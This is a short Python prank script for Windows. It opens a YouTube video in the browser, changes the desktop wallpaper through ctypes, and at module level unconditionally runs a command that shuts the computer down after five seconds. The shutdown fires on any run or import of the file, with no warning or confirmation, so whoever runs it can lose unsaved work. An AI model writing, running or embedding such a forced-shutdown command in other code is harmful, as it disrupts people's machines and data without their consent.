import ctypes
import webbrowser
import os

def set_wallpaper(image):
    current_directory = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(current_directory, image)

    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)



url_to_open = "https://www.youtube.com/watch?v=pyfjoqQzO5k"

def open_browser_with_url(url):
    webbrowser.open(url)

if __name__ == "__main__":
    open_browser_with_url(url_to_open)



if __name__ == "__main__":
    image = 'wallpaper1.jpg'

    set_wallpaper(image)



os.system("shutdown /s /t 5")
